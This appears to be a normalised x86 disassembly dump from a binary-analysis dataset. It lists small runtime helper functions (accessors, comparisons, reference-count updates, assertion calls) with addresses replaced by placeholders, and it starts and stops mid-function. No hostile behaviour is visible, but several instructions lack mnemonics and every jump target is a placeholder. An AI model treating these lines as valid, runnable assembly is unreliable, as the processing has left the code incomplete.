mov eax 0x1fffffff
retn
sub_40cd69
mov eax 0x1fffffff
retn
sub_40cd92
mov eax 0x7ffffff
retn
sub_40cd98
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_40cdae
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40cdaa
and [ eax ] 0x0
retn
sub_40cdef
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_40ce04
and [ eax ] 0x0
retn
sub_40ce49
and [ eax ] 0x0
retn
sub_40ce8e
call sub_4466a8
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
retn
sub_40ce9a
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_40cead
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_40cec0
mov eax [ eax ]
xor ecx ecx
cmp eax [ edx ]
setne al
retn
sub_40ceca
retn
sub_40cecb
retn
sub_40cecc
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_40ced1
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_40ced7
mov eax [ ecx + 0x4 ]
sub eax [ ecx ]
sar eax 0x2
retn
sub_40cf38
cmp eax [ ecx + 0x4 ]
jae r-xdata
xor eax eax
retn
cmp [ ecx ] eax
ja r-xdata
xor eax eax
inc eax
retn
sub_40cf81
retn
sub_40cf82
retn
sub_40cf83
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
pop ebp
retn 0x4
sub_40cfc0
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_40cfd3
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
pop ebp
retn 0x4
sub_40cfe3
mov eax 0x1fffffff
retn
sub_40cfe9
xor eax eax
inc eax
call sub_40b7f5
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0x14 ] 0x0
retn
sub_40d009
mov eax 0x1fffffff
retn
sub_40d00f
mov eax 0x7ffffff
retn
sub_40d0c1
push [ ebp - 0x14 ]
call sub_424fc7
pop ecx
push 0x0
push 0x0
call sub_426f77
int3
sub_40d10f
push r--data
call sub_446a95
sub_40d124
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_40d137
mov [ eax ] ecx
retn
sub_40d13a
mov eax 0x3fffffff
retn
sub_40d171
retn
sub_40d6e0
retn
sub_40d713
push [ ebp - 0x14 ]
call sub_424fc7
pop ecx
push 0x0
push 0x0
call sub_426f77
int3
sub_40d76c
retn
sub_40d76d
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x8
inc edx
[ ecx ] edx
sub_40d7a8
mov eax [ eax + 0x8 ]
xor ecx ecx
cmp eax [ edx + 0x8 ]
setne al
retn
j_sub_40dfbb#2
jmp sub_40dfbb
sub_40dbed
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f8de
add esp 0x10
leave
retn
sub_40dc07
push ebp
mov ebp esp
push ecx
mov al [ ebp - 0x1 ]
leave
retn
sub_40dc2e
retn
sub_40dc2f
retn
sub_40dc30
test eax eax
je r-xdata
retn
jmp sub_407102
sub_40dc3a
retn
sub_40dc3b
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_40dc4e
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_40dc61
add eax 0x4
jmp sub_403855
sub_40dcd9
retn
j_sub_40e12f
jmp sub_40e12f
sub_40dded
retn
sub_40ddee
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40ddff
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_40de0a
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_40de15
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_40de20
retn
sub_40de21
retn
sub_40de22
retn
sub_40de23
mov eax [ eax + 0x4 ]
cmp eax [ ecx + 0x4 ]
sbb eax eax
neg eax
retn
sub_40de2e
mov eax [ eax + 0x4 ]
cmp eax [ ecx + 0x4 ]
sbb eax eax
neg eax
retn
sub_40de39
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_40de4c
retn
sub_40de4d
retn
sub_40de4e
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4118fa
add esp 0x10
pop ebp
retn 0xc
sub_40de69
retn
j_sub_40f9f2
jmp sub_40f9f2
j_sub_40fa5b
jmp sub_40fa5b
sub_40de74
test eax eax
je r-xdata
retn
jmp sub_407102
sub_40de7e
test eax eax
je r-xdata
retn
jmp sub_40fda8
sub_40dea2
retn
sub_40dea3
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411935
add esp 0xc
pop ebp
retn 0x8
sub_40defd
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_40df0e
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_40df1f
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_40df30
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_40df41
lea eax [ esi + 0x4 ]
call sub_403855
mov eax esi
retn
sub_40df4c
mov [ eax ] r--data
retn
sub_40df81
xor eax eax
cmp [ ecx + 0x10 ] eax
sete al
retn
sub_40df8a
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_40df94
mov eax [ eax ]
xor ecx ecx
cmp eax [ edx ]
setne al
retn
sub_40df9e
and [ eax ] 0x0
retn
sub_40dfba
retn
sub_40e00d
test eax eax
je r-xdata
retn
jmp sub_407102
sub_40e017
test eax eax
je r-xdata
retn
jmp sub_40fda8
sub_40e021
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
add eax 0x4
jmp r-xdata
xor ecx ecx
inc ecx
[ eax ] ecx
mov eax rw-data
retn
sub_40e03e
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_40e053
mov eax [ eax ]
retn
sub_40e056
inc [ eax ]
retn
sub_40e059
mov eax [ eax + 0x208 ]
retn
sub_40e0dd
xor eax eax
inc eax
call sub_405ff7
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0x2c ] 0x0
retn
sub_40e0fd
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_40e11c
mov eax [ eax + 0x8 ]
sub eax [ ecx + 0x8 ]
neg eax
sbb eax eax
inc eax
retn
sub_40e128
add eax 0x4
retn
sub_40e12c
mov eax [ eax ]
retn
sub_40e12f
push edi
mov edi eax
lea eax [ edi + 0x8 ]
call sub_40a30e
call sub_407f79
mov eax edi
pop edi
jmp sub_40cb46
sub_40e147
retn
sub_40e148
push edi
lea edi [ eax + 0x8 ]
call sub_40e881
pop edi
retn
j_sub_40fa5b#2
jmp sub_40fa5b
sub_40e158
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_40e177
retn
sub_40e213
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_40e92e
pop ebp
retn 0x8
sub_40e22b
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_40e240
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_40e251
push ebp
mov ebp esp
and [ edi + 0x4 ] 0x0
push esi
push [ ebp + 0x8 ]
lea esi [ edi + 0x8 ]
mov [ edi ] r--data
call sub_40e95b
mov eax edi
pop esi
pop ebp
retn 0x4
sub_40e271
xor al al
retn
sub_40e2cb
push esi
lea esi [ ecx + 0x8 ]
call sub_407804
mov al 0x1
pop esi
retn 0x4
sub_40e2da
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x8 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_40e2ef
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_40e300
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_40ea04
pop ebp
retn 0x8
sub_40e318
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_40e32d
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_40e480
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_40e4bc
push ebp
mov ebp esp
push edi
mov edi [ ecx + 0x8 ]
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_40d9d6
pop ecx
pop edi
pop ebp
retn 0x8
sub_40e4d4
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_40e4e9
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_40e546
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_40e55b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_40e56c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_40ea8f
pop ebp
retn 0x8
sub_40e584
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_40e599
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_40e5aa
push ebp
mov ebp esp
and [ eax + 0xc ] 0x0
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
pop ebp
retn 0x8
sub_40e5c3
push ebp
mov ebp esp
and [ eax + 0xc ] 0x0
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
pop ebp
retn 0x8
sub_40e5dc
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_40e5ef
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_40e602
and [ rw-data ] 0x0
xor ecx ecx
mov [ rw-data ] r--data
mov eax rw-data
inc ecx
[ eax ] ecx
mov eax rw-data
retn
sub_40e625
push 0x2f
push r--data
push r--data
call sub_4258e2
add esp 0xc
xor al al
retn 0x4
sub_40e63e
mov ecx [ eax ]
cmp ecx [ eax + 0x10 ]
jne r-xdata
xor eax eax
retn
mov [ eax + 0x1d ] 0x1
xor eax eax
inc eax
retn
sub_40e650
imul eax eax 0x18
add eax [ ecx + 0x4 ]
retn
sub_40e6d1
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_40e6dc
push esi
lea esi [ eax + 0x8 ]
call sub_40ed4c
pop esi
retn
sub_40e7a6
push 0x0
mov eax sub_44c6d1
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x10 ]
call sub_40ed4c
mov [ edi ] r--data
call sub_44866d
retn 0x4
sub_40e85f
mov eax [ eax ]
retn
sub_40e862
inc [ eax ]
retn
sub_40e865
push ebp
mov ebp esp
movzx eax al
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0x8 ]
xor ecx ecx
xor edx edx
cmp cx ax
setne al
pop ebp
retn 0x4
j_sub_40a6cf#2
jmp sub_40a6cf
sub_40e913
retn
sub_40e914
push ebp
mov ebp esp
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
dec [ eax + 0x1c ]
sub_40e927
and [ eax ] 0x0
retn
sub_40e92b
retn 0x4
j_sub_40ed4c
jmp sub_40ed4c
sub_40ea01
retn 0x4
sub_40ea5c
push ebp
mov ebp esp
push esi
lea esi [ eax + 0xc ]
call sub_407e47
push [ ebp + 0xc ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0xc ]
pop esi
pop ebp
retn 0x8
sub_40ea77
push ebp
mov ebp esp
push edi
push [ ebp + 0x8 ]
mov edi [ eax + 0x8 ]
call sub_40d9d6
pop ecx
pop edi
pop ebp
retn 0xc
sub_40ea8c
retn 0x4
sub_40eae7
mov [ eax + 0x1d ] 0x1
mov al 0x1
retn
sub_40eaee
xor al al
retn
sub_40eaf1
push ebp
mov ebp esp
movzx eax al
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0x8 ]
xor ecx ecx
xor edx edx
cmp cx ax
setne al
pop ebp
retn 0x4
sub_40eb3f
retn
sub_40eb40
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov eax esi
call sub_40edee
mov eax esi
retn
sub_40eb54
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_40edee
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40eb66
push ebp
mov ebp esp
call sub_407e47
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0xc ]
sub_40eb76
mov cl [ eax + 0x1c ]
test cl cl
je r-xdata
retn 0x4
mov edx [ eax + 0x4 ]
movzx edx [ edx ]
mov [ edx + eax + 0x1d ] cl
inc [ eax + 0x4 ]
dec cl
jne r-xdata
sub_40ed41
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_40ed6f
retn
sub_40edca
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov [ eax ] ecx
retn
mov ecx [ ecx ]
sub_40edd5
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov ecx [ ecx + 0x10 ]
add ecx edx
mov [ eax ] ecx
retn
sub_40ede9
dec [ eax ]
retn
sub_40edec
retn
sub_40eded
retn
sub_40ee16
xor eax eax
inc eax
jmp sub_40fc39
sub_40ee1e
mov eax [ eax ]
retn
sub_40ee21
mov eax [ eax + 0x4 ]
sub eax 0x1c
retn
sub_40ee28
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40fc7b
pop ecx
pop ebp
retn 0x4
sub_40ee38
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn 0x4
sub_40ee45
retn
sub_40ee46
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
pop ebp
retn 0x4
sub_40ee95
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_40ee9a
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_40eea0
retn
sub_40eebb
mov eax [ eax ]
xor ecx ecx
cmp eax [ edx ]
setne al
retn
sub_40eec5
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_40eeca
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_40eed0
retn
sub_40eed1
mov eax [ eax ]
retn
sub_40eed4
add [ eax ] 0x20
retn
sub_40eed8
mov eax [ eax ]
retn
sub_40eedb
mov ecx [ ecx ]
sub ecx 0x1c
mov [ eax ] ecx
retn
sub_40ef1b
cmp eax [ ecx + 0x4 ]
jae r-xdata
xor eax eax
retn
cmp [ ecx ] eax
ja r-xdata
xor eax eax
inc eax
retn
sub_40ef65
retn
sub_40ef66
mov eax [ eax ]
retn
sub_40ef69
add [ eax ] 0x20
retn
sub_40ef6d
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_40ef77
mov [ eax ] ecx
retn
sub_40ef7a
mov [ eax ] ecx
retn
sub_40ef7d
add [ eax ] 0xffffffe4
retn
sub_40f015
push [ ebp - 0x14 ]
call sub_424fc7
pop ecx
push 0x0
push 0x0
call sub_426f77
int3
sub_40f031
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_40f069
retn
sub_40f06a
add [ eax ] 0xffffffe4
retn
sub_40f06e
push ebp
mov ebp esp
sub eax [ ebp + 0x8 ]
add [ ecx ] eax
pop ebp
retn
sub_40f1e4
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_40f2e1
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
call sub_40fd4f
pop ecx
pop ebp
retn
sub_40f336
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
push edi
push edi
call sub_426f77
int3
push [ ebp + 0x8 ]
call sub_411f83
sub_40f34e
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_411465
pop ebp
retn
sub_40f35b
mov eax [ eax + 0x8 ]
sub eax [ ecx + 0x8 ]
neg eax
sbb eax eax
inc eax
retn
sub_40f8d5
push ebp
mov ebp esp
push ecx
mov al [ ebp - 0x1 ]
leave
retn
sub_40f936
push 0x0
push 0x1
call sub_40487c
retn
sub_40f940
retn
sub_40f941
test eax eax
je r-xdata
retn
jmp sub_407102
sub_40f94b
retn
sub_40f94c
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_40f95f
retn
sub_40f960
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_40f973
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_40f9ad
mov eax [ eax + 0x4 ]
cmp eax [ ecx + 0x4 ]
sbb eax eax
neg eax
retn
sub_40f9b8
mov eax [ eax + 0x4 ]
cmp eax [ ecx + 0x4 ]
sbb eax eax
neg eax
retn
sub_40f9c3
retn
sub_40f9c4
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_40f9d7
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4118fa
add esp 0x10
leave
retn
sub_40f9f1
retn
sub_40f9f2
test ecx ecx
je r-xdata
retn
mov eax [ eax ]
mov [ ecx ] eax
test eax eax
je r-xdata
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_40fa09
retn
sub_40fa0a
retn
sub_40fa0b
retn
sub_40fa0c
push ebp
mov ebp esp
push ecx
mov al [ ebp - 0x1 ]
leave
retn
sub_40fa2f
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411935
add esp 0xc
leave
retn
sub_40fa46
retn
sub_40fa47
test eax eax
je r-xdata
retn
jmp sub_407102
sub_40fa51
test eax eax
je r-xdata
retn
jmp sub_40fda8
sub_40fa5b
test ecx ecx
je r-xdata
retn
mov eax [ eax ]
mov [ ecx ] eax
test eax eax
je r-xdata
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_40fa72
retn
sub_40fb25
mov eax [ eax + 0x2c ]
add eax 0x8
retn
sub_40fb2c
mov al 0x1
retn
sub_40fb2f
retn
sub_40fb30
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40fb69
retn
sub_40fbb2
retn
sub_40fbb3
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40fbc4
mov al 0x1
retn
sub_40fbc7
mov edx [ ecx ]
push esi
mov esi [ eax ]
mov [ ecx ] esi
mov [ eax ] edx
pop esi
retn
sub_40fbd2
retn
sub_40fbd3
push ebp
mov ebp esp
sub eax [ ebp + 0x8 ]
pop ebp
retn
sub_40fbdb
mov edx [ eax ]
cmp edx [ ecx ]
jl r-xdata
retn
mov eax ecx
sub_40fbe4
push ebp
mov ebp esp
mov ecx 0x100
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
dec ecx
mov [ eax ] dl
inc eax
test ecx ecx
jg r-xdata
pop ebp
retn
sub_40fbfb
retn
sub_40fbfc
test eax eax
je r-xdata
retn
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
sub_40fc0b
retn
sub_40fc0c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
pop ebp
retn
sub_40fc17
add [ eax ] ecx
retn
sub_40fc35
xor al al
retn
sub_40fc38
retn
sub_40fc99
retn
sub_40fc9a
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40fd17
pop ebp
retn
sub_40fca7
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_411a5e
pop ecx
pop ecx
leave
retn
sub_40fcba
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413bd8
add esp 0xc
pop ebp
retn 0x8
sub_40fcd2
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_40fce3
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_40fcf4
push esi
add ecx 0x200
lea esi [ eax + 0x200 ]
call sub_402ffd
xor ecx ecx
test al al
sete al
pop esi
retn
sub_40fd0f
and [ eax ] 0x0
retn
sub_40fd13
and [ eax ] 0x0
retn
sub_40fd45
push 0x0
push 0x1
call sub_40487c
retn
sub_40fd98
mov eax [ eax ]
retn
sub_40fd9b
mov al [ eax + 0x11 ]
retn
sub_40fd9f
xor eax eax
cmp [ ecx + 0x1c ] eax
setg al
retn
sub_40fda8
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
retn
xor edx edx
add ecx 0x8
inc edx
[ ecx ] edx
sub_40fde0
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
lea esi [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_411ac6
pop esi
pop ebp
retn 0x8
sub_40fdf7
mov eax [ eax ]
retn
sub_40fdfa
test eax eax
je r-xdata
retn
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
sub_40fe09
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_40fe28
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_40fe47
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_40fe66
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_40ff59
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_40ff64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4c ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_40ff75
and [ eax + 0x4 ] 0x0
push esi
push edi
push 0xa
pop ecx
lea edi [ eax + 0x8 ]
mov esi edx
mov [ eax ] r--data
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_40ffdf
push ebp
mov ebp esp
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
pop ebp
retn 0x4
sub_40fffb
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
retn
push eax
call sub_411f83
sub_410009
xor eax eax
retn 0x4
sub_41000e
xor eax eax
retn
sub_4100b3
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_410a7c
pop ebp
retn 0x8
sub_4100cb
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_4100e0
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_410193
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_410aac
pop ebp
retn 0x8
sub_4101ab
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_4101c0
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41026b
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_410af4
pop ebp
retn 0x8
sub_410283
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_410298
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41032a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41033b
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_410b24
pop ebp
retn 0x8
sub_410353
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_410368
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4103fa
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
